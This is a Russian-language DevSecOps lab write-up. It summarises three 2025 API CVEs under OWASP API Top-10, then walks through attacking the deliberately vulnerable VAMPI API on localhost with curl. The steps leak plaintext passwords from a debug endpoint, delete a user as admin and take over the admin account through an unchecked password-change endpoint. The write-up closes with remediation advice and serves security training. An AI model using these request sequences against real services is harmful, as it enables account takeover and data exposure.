# Симуляция атаки по OWASP API Top-10 на стенде VAMPI

## Часть 1. Свежие CVE из категорий OWASP API Top-10

Из CVE за 2025 год отобрал три случая, которые ложатся на разные категории OWASP API Security Top-10 и при этом достаточно подробно описаны


**CVE-2025-9485, OAuth Single Sign On (WordPress).** 
Уязвимы все версии плагина до 6.26.12 включительно. Беда сидит в функции `get_resource_owner_from_id_token`: плагин принимает JWT-токен от внешнего OAuth/OIDC-провайдера, достаёт из него claim `sub` и логинит соответствующего пользователя в WordPress. Криптографическая подпись токена при этом не проверяется. Атакующему достаточно локально склеить JWT, поставить в `sub` произвольный user ID (включая админский) и отправить плагину. По OWASP API Security Top-10 это API2:2023 Broken Authentication: формальный механизм авторизации присутствует, но конкретно проверка подписи отсутствует, и токен превращается в "записку" о том, кем себя назвать


**CVE-2025-2304, Camaleon CMS.** 
Привычная Rails-овая история с mass assignment.
- компонент — `UsersController`, метод `update_ajax`, который вызывается при смене пароля пользователя
- причина — внутри метода вызывается `permit!` без аргументов, и это пропускает в модель ровно те параметры, которые пришли в запросе, без какого-либо белого списка
- эксплуатация — в JSON-теле запроса на смену пароля атакующий дописывает поле `role` (или эквивалентное) и поднимает себе привилегии, потому что параметр уходит прямо в БД
- по классификации это API6:2019 Mass Assignment, в редакции 2023 это поглощено категорией API3:2023 Broken Object Property Level Authorization
- фикс: заменить `permit!` на `permit(:password, :password_confirmation)` с явным перечислением полей

**CVE-2025-9209, RestroPress (WordPress).** 
Эндпоинт `/wp-json/wp/v2/users` в плагине без аутентификации возвращает поля с приватными токенами и API-ключами пользователей. По описанию NVD это попадает под CWE-200 Information Exposure, по OWASP API Top-10 это API3:2023 Broken Object Property Level Authorization (бывшая категория API3:2019 Excessive Data Exposure). Особенность в том, что утечка не требует никаких prerequisite: один анонимный GET даёт атакующему токены, по которым он тут же собирает JWT и заходит как админ. Эта CVE напрямую перекликается с тем, что я нашёл во второй части лабы на стенде VAMPI

Все три проверял на nvd.nist.gov.


## Часть 2. Атака на стенд

### Запуск и осмотр API

Образ скачал и запустил:
```
docker pull ket9/otus-devsecops-owasp-rest
docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest
curl http://localhost:8080/createdb
```

Корневой эндпоинт вернул карту API:
```
"посмотреть информацию обо всех пользователях": "/users/v1",
"посмотреть подробную информацию обо всех пользователях": "/users/v1/_debug",
"регистрация нового пользователя": "/users/v1/register (HTTP POST)",
...
"удалить пользователя по имени (только для админов)": "/users/v1/{username} (HTTP DELETE)",
"изменить пароль пользователя": "/users/v1/{username}/password (HTTP PUT)",
```

Сразу две вещи зацепили глаз. Первое — рядом с обычным `/users/v1` лежит `/users/v1/_debug`. Подчёркивание в имени пути обычно сигналит про служебное, и слово debug в проде вообще не должно встречаться. Второе — у DELETE отдельно прописано "только для админов", а у PUT смены пароля никакой пометки нет. То есть, видимо, поменять пароль может кто угодно из авторизованных. Это место решил проверить отдельно.


### Разведка через GET

Сравнил, что отдают два соседних эндпоинта:
```
$ curl -s http://localhost:8080/users/v1
{
  "users": [
    {"email": "mail1@mail.com", "username": "name1"},
    {"email": "mail2@mail.com", "username": "name2"},
    {"email": "admin@mail.com", "username": "admin"}
  ]
}
```

```
$ curl -s http://localhost:8080/users/v1/_debug
{
  "users": [
    {"admin": false, "email": "mail1@mail.com", "password": "pass1", "username": "name1"},
    {"admin": false, "email": "mail2@mail.com", "password": "pass2", "username": "name2"},
    {"admin": true,  "email": "admin@mail.com", "password": "pass1", "username": "admin"}
  ]
}
```

`/_debug` доступен анонимно(никакого `Authorization` я не передавал) и возвращает два поля, которых в публичном эндпоинте нет: `password` и `admin`. Пароли лежат в чистом виде, без хеша. Один анонимный GET выгребает все учётки приложения, включая `admin/pass1`. Дальше я хотел убедиться, что это не "потёмкинская" утечка и пароли реально рабочие


### Захват админки через утёкший пароль

Залогинился админом:
```
$ curl -s -X POST http://localhost:8080/users/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"pass1"}'
{
  "auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
  "message": "Successfully logged in.",
  "status": "success"
}
```

Прилетел нормальный JWT. Приметил момент: в payload `exp - iat = 60` секунд, токен живёт всего минуту. Из-за этого первая попытка удаления юзера у меня провалилась — токен истёк, пока я его копировал. Переделал так, чтобы получить токен и сразу же его использовать одним блоком в shell-переменной:
```
TOKEN=$(curl -s -X POST http://localhost:8080/users/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"pass1"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['auth_token'])")

curl -s -X DELETE http://localhost:8080/users/v1/name1 \
    -H "Authorization: Bearer $TOKEN"
```

Ответ:
```
{"message": "User deleted.", "status": "success"}
```

Проверил список через `/users/v1`: `name1` действительно пропал, остались `name2`, `admin` и `evil` (про `evil` ниже). То есть утечка `_debug` не теоретическая — взяв оттуда пароль, можно полноценно делать админские операции.


### Неудачная попытка: mass assignment при регистрации

Параллельно проверял, нет ли mass assignment на регистрации. Endpoint `/users/v1/register` публичный, токен не нужен. Закинул в тело лишнее поле `admin: true`:
```
$ curl -s -X POST http://localhost:8080/users/v1/register \
    -H "Content-Type: application/json" \
    -d '{"username":"evil","password":"x","email":"e@e.e","admin":true}'
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```

Регистрация прошла, но в `/_debug` у `evil` оказалось `admin: false`. Сервер тихо проигнорировал лишнее поле. По-хорошему, кстати, это правильное поведение, но интересно, что про подавление лишних полей сервер ничего не сообщил — никакого предупреждения. Я ожидал, что mass assignment пройдёт по аналогии с многими CMS, но конкретно у VAMPI этот вектор закрыт. 


### BFLA на смене пароля

Возвращаюсь к подозрительному PUT `/users/v1/{username}/password`. Мое предположение: эндпоинт проверяет валидность токена, но не проверяет, что `username` в URL равен `sub` из JWT. Если так, любой авторизованный юзер сможет сменить пароль кому угодно

Логинюсь обычным юзером `name2` (его пароль `pass2` знаю из утечки) и пробую сменить пароль админу:
```
TOKEN_N2=$(curl -s -X POST http://localhost:8080/users/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"name2","password":"pass2"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['auth_token'])")

curl -s -X PUT http://localhost:8080/users/v1/admin/password \
    -H "Authorization: Bearer $TOKEN_N2" \
    -H "Content-Type: application/json" \
    -d '{"password":"hacked-by-name2"}'
```

Сервер вернул вообще пустой ответ, `python3 -m json.tool` даже ругнулся "Expecting value: line 1 column 1 (char 0)". Содержательная часть проверилась через `/_debug`:
```
{"admin": true, "email": "admin@mail.com", "password": "hacked-by-name2", "username": "admin"}
```

Пароль админа реально поменялся на `hacked-by-name2`. Гипотеза подтвердилась: эндпоинт принимает токен любого валидного пользователя и не сверяет, чьим паролем он распоряжается. Имея учётку обычного пользователя (а её тут можно зарегистрировать хоть в двух кликах через `/register`), можно перехватить админский аккаунт


### Что в итоге найдено

По итогам нашёл два подтверждённых недостатка и один отрицательный результат.

- 1 — `/users/v1/_debug` без авторизации возвращает все учётки с паролями в открытом виде и флагом `admin`. Это API3:2023 Broken Object Property Level Authorization (в редакции 2019 это шло отдельной категорией API3 Excessive Data Exposure). Доп.фактор — пароли лежат plaintext, что относится уже к API2 Broken Authentication, и именно из-за этого утечка такая критичная

- 2 — PUT `/users/v1/{username}/password` проверяет валидность JWT, но не проверяет, что `username` в URL равен субъекту токена. Это API5:2023 Broken Function Level Authorization: операция, которая должна быть доступна только владельцу ресурса (или админу), доступна любому авторизованному юзеру

Mass assignment на регистрации не воспроизвёлся, в обоих использованных вариантах сервер игнорировал поле `admin`.


### Меры предотвращения

По первой уязвимости. Самое прямое решение — убрать `/_debug` из прода полностью. Если эндпоинт нужен в dev сборке, выкатывать его условно, например по флагу окружения, и плюс прятать за интернал сетью или базовой HTTP аутентификацией. На уровне ORM в принципе не селектить поле `password` для ответов API, либо использовать DTO/serializer с белым списком полей (`UserPublicSchema`), или помечать колонку как `select=False` в SQLAlchemy. Сами пароли хранить bcrypt/argon2-хешем с солью, тогда даже при повторной утечке атакующий получит хеши, а не готовые пары логин/пароль.

По второй. В обработчике PUT `/users/v1/<username>/password` сравнивать `username` из URL с `sub` из декодированного JWT. Не совпадают — отдавать ошибку. Дополнительно требовать в теле текущий пароль (`old_password`) и проверять его против хеша из БД, тогда даже компрометация токена не даст сменить пароль без знания старого.

Общие. JWT с lifetime 60 секунд это перегиб в сторону безопасности, но без refresh-токена становится неудобно на практике. В реальном API разумнее 15-30 минут access + отдельный refresh. Все эндпоинты, помеченные "только для админов" (как DELETE), должны проверять не только валидность токена, но и поле `admin: true` в claims, и желательно ещё один раз — на бэке, через текущее состояние пользователя в БД, потому что флаг в JWT может быть устаревшим.
